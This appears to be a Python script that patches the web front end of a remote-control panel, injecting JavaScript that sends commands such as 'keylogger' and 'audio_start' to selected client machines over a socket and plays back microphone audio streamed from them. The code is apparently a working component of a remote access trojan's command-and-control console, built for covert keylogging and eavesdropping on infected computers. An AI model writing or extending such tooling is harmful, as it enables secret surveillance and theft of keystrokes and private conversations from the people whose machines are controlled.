import os

target_file = 'c:/Users/danya/Downloads/baron-main/templates/index.html'
with open(target_file, 'r', encoding='utf-8') as f:
    html = f.read()

# 1. Define execute and update cmd
execute_js = r"""
function execute(cid, action, params = {}) {
    if(!cid) return;
    const cmdData = Object.assign({ cid: cid, action: action }, params);
    socket.emit('command', cmdData);
    logTerminal(`Sent <${action}> to ${cid.substring(0,8)}`, 'sys');
}

// Override or update cmd
if (typeof original_cmd === 'undefined') {
    var original_cmd = window.cmd;
    window.cmd = function(action) {
        if(!selectedClient) return;
        if(action === 'audio_start') { 
            if(typeof startAudioStream === 'function') startAudioStream(); 
        }
        if(action === 'keylogger') {
            if(typeof startKeylogger === 'function') startKeylogger();
        }
        execute(selectedClient, action);
    };
}

// PCM Player logic
let nextAudioTime = 0;
function playPCM(base64Data) {
    if(!audioCtx) return;
    const binary = atob(base64Data);
    const len = binary.length;
    const buffer = new Int16Array(len / 2);
    for (let i = 0; i < len; i += 2) {
        buffer[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
    }
    
    const float32 = new Float32Array(buffer.length);
    for (let i = 0; i < buffer.length; i++) {
        float32[i] = buffer[i] / 32768; 
    }
    
    const audioBuffer = audioCtx.createBuffer(1, float32.length, 16000); 
    audioBuffer.getChannelData(0).set(float32);
    
    const source = audioCtx.createBufferSource();
    source.buffer = audioBuffer;
    source.connect(audioCtx.destination);
    
    let startTime = Math.max(audioCtx.currentTime, nextAudioTime);
    source.start(startTime);
    nextAudioTime = startTime + audioBuffer.duration;
}
"""

# 2. Add to Script section
if 'function execute' not in html:
    html = html.replace('// --- DRAGGABLE WINDOWS ENGINE ---', execute_js + '\n// --- DRAGGABLE WINDOWS ENGINE ---')

# 3. Update Audio socket handler
# Looking for: socket.on('audio_data') or handling result: audio_data
if "if(data.type === 'audio_data') {" in html:
    html = html.replace("if(data.type === 'audio_data') {", "if(data.type === 'audio_data') { playPCM(data.result); ")

with open(target_file, 'w', encoding='utf-8') as f:
    f.write(html)
print("FINAL_FRONTEND_APPLIED")
